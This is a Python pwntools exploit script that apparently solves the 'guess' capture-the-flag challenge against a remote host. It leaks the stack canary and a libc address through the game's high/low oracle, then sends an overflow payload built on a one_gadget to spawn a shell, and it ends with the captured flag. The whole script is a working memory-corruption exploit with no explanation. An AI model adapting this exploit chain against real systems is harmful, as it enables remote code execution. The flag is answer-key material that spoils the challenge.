from pwn import *

#target = process('./guess')
#+229, +374
#pid = gdb.attach(target, "\nb *main+356\n set disassembly-flavor intel\ncontinue")

target = remote('193.57.159.27', 55206)
elf = ELF('guess')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
libc = ELF('libc6_2.31-0ubuntu9.2_amd64.so')
count = 0

i = 1
depth = 0
addition = 0
canary = 0
while True:
	print(target.recvuntil(b'(0-7)?'))
	target.sendline(str(0x20 + i).encode('ascii'))
	print(target.recvuntil(b'guess:'))
	my_guess = 0x100 // 2 + addition
	print(hex(my_guess))
	target.sendline(str(my_guess).encode('ascii'))
	result = target.recvuntil(b'Which')
	depth += 1
	if b'low' in result:
		if depth == 7:
			my_guess += 1
			canary += (0x10 ** (2 * i)) * my_guess
			print(hex(canary))
			i += 1
			depth = 0
			addition = 0
		else:
			addition += 0x100 // (2 ** (depth + 1))
	elif b'high' in result:
		if depth == 7:
			my_guess -= 1
			canary += (0x10 ** (2 * i)) * my_guess
			print(hex(canary))
			i += 1
			depth = 0
			addition = 0
		else:
			addition += -1 * (0x100 // (2 ** (depth + 1)))
	else:
		canary += (0x10 ** ( 2 * i)) * my_guess
		print(hex(canary))
		i += 1
		depth = 0
		addition = 0
		count += 1
	if i == 8:
		break

i = 1
depth = 0
addition = 0
libc_leak = 0xb3

while True:
	print(target.recvuntil(b'(0-7)?'))
	target.sendline(str(0x30 + i).encode('ascii'))
	print(target.recvuntil(b'guess:'))
	my_guess = 0x100 // 2 + addition
	print(hex(my_guess))
	target.sendline(str(my_guess).encode('ascii'))
	result = target.recvuntil(b'Which')
	depth += 1
	print(depth)
	if b'low' in result:
		if depth == 7:
			my_guess += 1
			libc_leak += (0x10 ** (2 * i)) * my_guess
			print(hex(libc_leak))
			i += 1
			depth = 0
			addition = 0
			
		else:
			addition += 0x100 // (2 ** (depth + 1))
		
	elif b'high' in result:
		if depth == 7:
			my_guess -= 1
			libc_leak += (0x10 ** (2 * i)) * my_guess
			print(hex(libc_leak))
			i += 1
			depth = 0
			addition = 0
		else:
			addition += -1 * (0x100 // (2 ** (depth + 1)))
		if my_guess == 0x1:
			my_guess = 0
			libc_leak += (0x10 ** (2 * i)) * my_guess
			print(hex(libc_leak))
			i += 1
			depth = 0
			addition = 0
	else:
		libc_leak += (0x10 ** (2 * i)) * my_guess
		print(hex(libc_leak))
		i += 1
		depth = 0
		addition = 0
		count += 1
	if i == 6:
		break
	

print('i used', count, 'guesses')
print('canary is', hex(canary))
print('libc leak is', hex(libc_leak))

#target.interactive()
for i in range(8 - count):
	print(target.recvuntil(b'(0-7)?', timeout=1))
	target.sendline(str(0x20).encode('ascii'))
	print(target.recvuntil(b'guess:', timeout=1))
	my_guess = 0
	print(hex(my_guess))
	target.sendline(str(my_guess).encode('ascii'))


print(target.recvuntil(b'game?'))

libc_start_main = libc_leak - 243
libc_base = libc_start_main - libc.symbols['__libc_start_main']
print('libc start main is at', hex(libc_start_main))
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

#Who knows why, but it only accepts execve, not system.
system = libc_base + libc.symbols['execve']
onegadget1 = libc_base + 0xe6e73
onegadget2 = libc_base + 0xe6e76
onegadget3 = libc_base + 0xe6e79


payload = b'\x00' * 24

payload += p64(canary)
payload += p64(libc_base + 0x1ee100)

payload += p64(onegadget3) 


target.sendline(payload)


target.interactive()

#rarctf{4nd_th3y_s41d_gu3ss1ng_1snt_fun!!_c9cbd665}
